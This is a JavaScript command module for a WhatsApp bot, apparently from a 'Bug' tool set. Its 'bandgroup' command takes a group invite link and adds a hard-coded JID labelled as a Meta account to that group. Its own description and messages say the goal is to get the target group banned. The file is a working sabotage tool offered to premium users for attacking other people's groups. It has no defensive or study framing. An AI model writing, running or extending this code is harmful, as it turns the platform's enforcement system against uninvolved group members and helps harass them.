import { parseGroupInviteCode, resolveGroupTarget, sleep } from "@/src/services/bug/index.js";

const TARGET_META = "13135550002@s.whatsapp.net";

export default {
  name: "bandgroup",
  aliases: ["bannedgroup", "bangroup"],
  description: "Eksekusi banned grup via link (add JID meta ke grup target)",
  usage: "https://chat.whatsapp.com/xxxx",
  category: "Bug",
  premiumOnly: true,
  run: async (sock, msg, args, { reply, prefix, commandName, logger }) => {
    const q = args.join(" ").trim();
    if (!q || !q.includes("chat.whatsapp.com")) {
      return reply(`*Syntax Error*\nExample: ${prefix + commandName} https://chat.whatsapp.com/xxxx`);
    }

    const codeGroup = parseGroupInviteCode(q);
    if (!codeGroup) return reply("❌ link group tidak valid!");

    const remoteJid = msg.key.remoteJid;
    await reply(`⏳ *processing...*\nsedang memproses link grup dan mengeksekusi target...`);

    (async () => {
      const log = logger || console;
      let target;
      try {
        target = await resolveGroupTarget(sock, q);
      } catch (e) {
        log?.error?.(`[bandgroup] mengambil info grup: ${e?.message || e}`);
        return sock.sendMessage(
          remoteJid,
          { text: `❌ gagal memproses link grup: ${e?.message || e}` },
          { quoted: msg },
        );
      }

      try {
        await sock.groupParticipantsUpdate(target, [TARGET_META], "add");
        await sleep(500);
        await sock.sendMessage(
          remoteJid,
          { text: `✅ *Sukses Banned!*\nTarget Grup: ${target}` },
          { quoted: msg },
        );
      } catch (err) {
        log?.error?.("[bandgroup] Error:", err?.message || err);
        await sock.sendMessage(
          remoteJid,
          {
            text: `⚠️ *Info Banned*\nRequest penambahan dikirim jika grup butuh acc sistem akan menunggu persetujuan\n\nlog: ${err?.message || err}`,
          },
          { quoted: msg },
        );
      }
    })();
  },
};
